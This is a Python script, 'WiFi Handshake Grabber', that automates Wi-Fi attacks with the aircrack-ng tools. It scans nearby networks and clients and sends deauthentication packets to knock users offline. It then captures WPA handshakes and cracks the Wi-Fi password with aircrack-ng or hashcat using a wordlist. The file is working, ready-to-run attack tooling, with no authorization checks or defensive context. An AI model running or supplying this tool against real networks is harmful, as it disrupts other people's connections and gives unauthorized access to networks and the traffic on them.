#!/usr/bin/env python3

import subprocess
import argparse
import time
import re
import os
import sys
import signal
import logging
import configparser
from tqdm import tqdm
from pathlib import Path

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
BLUE = "\033[94m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# Simplified Logo
LOGO = """
WiFi Handshake Grabber v1.0
---------------------------
"""

def setup_logging(output_dir):
    """Set up logging to a file."""
    log_file = os.path.join(output_dir, "wifi_grabber.log")
    logging.basicConfig(filename=log_file, level=logging.INFO, format="%(asctime)s - %(message)s")
    logging.info("WiFi Handshake Grabber started")

def run_command(command, verbose=False):
    """Execute a shell command and return its output."""
    if verbose:
        print(f"{BLUE}[*] Running: {command}{RESET}")
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
        logging.info(f"Executed: {command}")
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Error: {e.stderr}{RESET}")
        logging.error(f"Command failed: {command} - {e.stderr}")
        return None

def check_adapter_compatibility(interface):
    """Verify if the adapter supports monitor mode and packet injection."""
    print(f"{BLUE}[*] Checking adapter compatibility...{RESET}")
    output = run_command(f"sudo aireplay-ng -9 {interface}")
    if output and "Injection is working" in output:
        print(f"{GREEN}[+] Adapter supports packet injection.{RESET}")
    else:
        print(f"{YELLOW}[!] Adapter may not support packet injection. Proceed with caution.{RESET}")

def get_wifi_interface():
    """Detect the Wi-Fi interface."""
    output = run_command("iwconfig")
    if not output:
        print(f"{RED}[!] Failed to detect interfaces.{RESET}")
        sys.exit(1)
    for line in output.splitlines():
        if "IEEE 802.11" in line:
            return line.split()[0]
    print(f"{RED}[!] No Wi-Fi interface found. Plug in a compatible adapter.{RESET}")
    sys.exit(1)

def enable_monitor_mode(interface, verbose=False):
    """Enable monitor mode on the Wi-Fi interface."""
    print(f"{BLUE}[*] Enabling monitor mode on {interface}...{RESET}")
    run_command("sudo airmon-ng check kill", verbose)
    if run_command(f"sudo airmon-ng start {interface}", verbose) is None:
        print(f"{RED}[!] Failed to enable monitor mode.{RESET}")
        sys.exit(1)
    return f"{interface}mon"

def scan_networks(interface, verbose=False):
    """Scan for nearby Wi-Fi networks with a progress bar."""
    print(f"{BLUE}[*] Scanning networks...{RESET}")
    try:
        with tqdm(total=10, desc="Scanning", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}s") as pbar:
            process = subprocess.Popen(f"sudo airodump-ng {interface}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            for _ in range(10):
                time.sleep(1)
                pbar.update(1)
            process.send_signal(signal.SIGINT)
            output, _ = process.communicate()
    except Exception as e:
        print(f"{RED}[!] Scan failed: {e}{RESET}")
        sys.exit(1)

    networks = []
    for line in output.splitlines():
        if re.match(r"^[0-9A-F]{2}(:[0-9A-F]{2}){5}", line):
            parts = line.split()
            bssid = parts[0]
            channel = parts[5] if len(parts) > 5 else "N/A"
            essid = " ".join(parts[13:]) if len(parts) > 13 else "<hidden>"
            networks.append({"bssid": bssid, "channel": channel, "essid": essid})
    if not networks:
        print(f"{YELLOW}[!] No networks found. Try adjusting your adapter or location.{RESET}")
        sys.exit(1)
    return networks

def scan_clients(interface, bssid, channel, verbose=False):
    """Scan for connected clients with a progress bar."""
    print(f"{BLUE}[*] Scanning for clients on {bssid}...{RESET}")
    cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} {interface}"
    try:
        with tqdm(total=10, desc="Scanning Clients", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}s") as pbar:
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            for _ in range(10):
                time.sleep(1)
                pbar.update(1)
            process.send_signal(signal.SIGINT)
            output, _ = process.communicate()
    except Exception as e:
        print(f"{RED}[!] Client scan failed: {e}{RESET}")
        return []

    clients = []
    client_section = False
    for line in output.splitlines():
        if "STATION" in line:
            client_section = True
            continue
        if client_section and re.match(r"^[0-9A-F]{2}(:[0-9A-F]{2}){5}", line):
            parts = line.split()
            clients.append(parts[0])
    return clients

def select_target(networks, interface, verbose=False, non_interactive=False, bssid=None, channel=None, client=None):
    """Select a network and optionally a client."""
    if non_interactive:
        if not (bssid and channel):
            print(f"{RED}[!] BSSID and channel required in non-interactive mode.{RESET}")
            sys.exit(1)
        return {"bssid": bssid, "channel": channel}, client

    print(f"\n{BLUE}[*] Available networks:{RESET}")
    for i, net in enumerate(networks):
        print(f"{i}: {net['essid']} (BSSID: {net['bssid']}, Channel: {net['channel']})")
    choice = input(f"{BLUE}[?] Enter network number: {RESET}")
    try:
        choice = int(choice)
        if 0 <= choice < len(networks):
            target = networks[choice]
        else:
            raise ValueError
    except ValueError:
        print(f"{RED}[!] Invalid choice.{RESET}")
        sys.exit(1)

    clients = scan_clients(interface, target["bssid"], target["channel"], verbose)
    if clients:
        print(f"\n{BLUE}[*] Connected clients:{RESET}")
        for i, client in enumerate(clients):
            print(f"{i}: {client}")
        print(f"{len(clients)}: Broadcast deauth (all clients)")
        client_choice = input(f"{BLUE}[?] Enter client number (or {len(clients)} for broadcast): {RESET}")
        try:
            client_choice = int(client_choice)
            if 0 <= client_choice < len(clients):
                return target, clients[client_choice]
            elif client_choice == len(clients):
                return target, None
            else:
                raise ValueError
        except ValueError:
            print(f"{YELLOW}[!] Invalid client choice. Using broadcast deauth.{RESET}")
            return target, None
    return target, None

def capture_handshake(interface, bssid, channel, output_dir, verbose=False):
    """Start capturing the WPA handshake."""
    print(f"{BLUE}[*] Capturing handshake for {bssid} on channel {channel}...{RESET}")
    capture_file = os.path.join(output_dir, "handshake_capture")
    cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {capture_file} {interface} &"
    subprocess.Popen(cmd, shell=True)
    return capture_file

def deauth_attack(interface, bssid, client, deauth_count, verbose=False):
    """Perform a deauthentication attack."""
    print(f"{BLUE}[*] Sending {deauth_count} deauth packets...{RESET}")
    if client:
        cmd = f"sudo aireplay-ng --deauth {deauth_count} -a {bssid} -c {client} {interface}"
    else:
        cmd = f"sudo aireplay-ng --deauth {deauth_count} -a {bssid} {interface}"
    run_command(cmd, verbose)

def check_handshake(capture_file, verbose=False):
    """Check if a handshake was captured."""
    output = run_command(f"sudo aircrack-ng {capture_file}-01.cap", verbose)
    if output and "1 handshake" in output:
        print(f"{GREEN}[+] Handshake captured successfully!{RESET}")
        return True
    print(f"{YELLOW}[!] No handshake detected yet.{RESET}")
    return False

def crack_handshake(capture_file, wordlist, method, verbose=False):
    """Attempt to crack the handshake with a wordlistc andgiven method."""
    if not os.path.exists(wordlist):
        print(f"{RED}[!] Wordlist file '{wordlist}' not found.{RESET}")
        return
    print(f"{BLUE}[*] Cracking handshake with {method} and {wordlist}... (This may take a while){RESET}")
    if method == "aircrack":
        output = run_command(f"sudo aircrack-ng -w {wordlist} {capture_file}-01.cap", verbose)
        if output:
            if "KEY FOUND" in output:
                key = re.search(r"KEY FOUND! \[ (.+?) \]", output)
                if key:
                    print(f"{GREEN}[+] Password found: {key.group(1)}{RESET}")
                else:
                    print(f"{YELLOW}[!] Key found but couldn't parse password.{RESET}")
            else:
                print(f"{YELLOW}[!] Password not found in wordlist.{RESET}")
    elif method == "hashcat":
        hccapx_file = f"{capture_file}.hccapx"
        run_command(f"cap2hccapx {capture_file}-01.cap {hccapx_file}", verbose)
        if os.path.exists(hccapx_file):
            output = run_command(f"hashcat -m 2500 {hccapx_file} {wordlist}", verbose)
            if output and "Recovered" in output:
                key = re.search(r":(.+)$", output.splitlines()[-1])
                if key:
                    print(f"{GREEN}[+] Password found: {key.group(1)}{RESET}")
            else:
                print(f"{YELLOW}[!] Password not found in wordlist.{RESET}")
        else:
            print(f"{RED}[!] Failed to convert .cap to .hccapx.{RESET}")
    else:
        print(f"{RED}[!] Unsupported cracking method: {method}{RESET}")

def cleanup(interface, verbose=False):
    """Disable monitor mode and restore network services."""
    print(f"{BLUE}[*] Cleaning up...{RESET}")
    run_command(f"sudo airmon-ng stop {interface}", verbose)
    run_command("sudo systemctl start NetworkManager", verbose)

def load_config(config_file):
    """Load default settings from the config file."""
    config = configparser.ConfigParser()
    defaults = {"wordlist": "", "deauth_count": "10", "output_dir": "./output"}
    if os.path.exists(config_file):
        config.read(config_file)
        if "DEFAULT" in config:
            defaults.update(config["DEFAULT"])
    return defaults

def main():
    config = load_config("wifi_grabber.ini")
    parser = argparse.ArgumentParser(description="WiFi Handshake Grabber - Capture and crack WPA handshakes")
    parser.add_argument("--interface", help="Wi-Fi interface (e.g., wlan0)", default=None)
    parser.add_argument("--deauth-count", type=int, default=int(config["deauth_count"]), help="Number of deauth packets")
    parser.add_argument("--wordlist", help="Path to wordlist", default=config["wordlist"])
    parser.add_argument("--crack-method", choices=["aircrack", "hashcat"], default="aircrack", help="Cracking method")
    parser.add_argument("--output-dir", default=config["output_dir"], help="Directory for output files")
    parser.add_argument("--max-retries", type=int, default=3, help="Max retries for handshake capture")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--non-interactive", action="store_true", help="Run without prompts")
    parser.add_argument("--bssid", help="Target BSSID (non-interactive)")
    parser.add_argument("--channel", help="Target channel (non-interactive)")
    parser.add_argument("--client", help="Target client MAC (non-interactive)")
    args = parser.parse_args()

    # Check root privileges
    if os.geteuid() != 0:
        print(f"{RED}[!] This tool must be run as root (use sudo).{RESET}")
        sys.exit(1)

    # Display logo
    print(f"{GREEN}{LOGO}{RESET}")

    # Setup output directory and logging
    Path(args.output_dir).mkdir(parents=True, exist_ok=True)
    setup_logging(args.output_dir)

    # Setup interface
    interface = args.interface or get_wifi_interface()
    check_adapter_compatibility(interface)
    mon_interface = enable_monitor_mode(interface, args.verbose)

    # Scan and select target
    networks = scan_networks(mon_interface, args.verbose)
    target, client = select_target(networks, mon_interface, args.verbose, args.non_interactive, args.bssid, args.channel, args.client)
    bssid = target["bssid"]
    channel = target["channel"]

    # Capture handshake with retries
    capture_file = capture_handshake(mon_interface, bssid, channel, args.output_dir, args.verbose)
    time.sleep(2)
    for attempt in range(args.max_retries):
        deauth_attack(mon_interface, bssid, client, args.deauth_count * (attempt + 1), args.verbose)
        time.sleep(10)
        if check_handshake(capture_file, args.verbose):
            print(f"{GREEN}[+] Saved to {capture_file}-01.cap{RESET}")
            if args.wordlist:
                crack_choice = input(f"{BLUE}[?] Crack with {args.wordlist} using {args.crack_method}? (y/n): {RESET}").lower() if not args.non_interactive else "y"
                if crack_choice == 'y':
                    crack_handshake(capture_file, args.wordlist, args.crack_method, args.verbose)
            break
        print(f"{YELLOW}[!] Retry {attempt + 1}/{args.max_retries}{RESET}")

    # Cleanup
    cleanup(mon_interface, args.verbose)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{YELLOW}[!] Interrupted by user. Cleaning up...{RESET}")
        cleanup(f"{get_wifi_interface()}mon")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}[!] Unexpected error: {e}{RESET}")
        cleanup(f"{get_wifi_interface()}mon")
        sys.exit(1)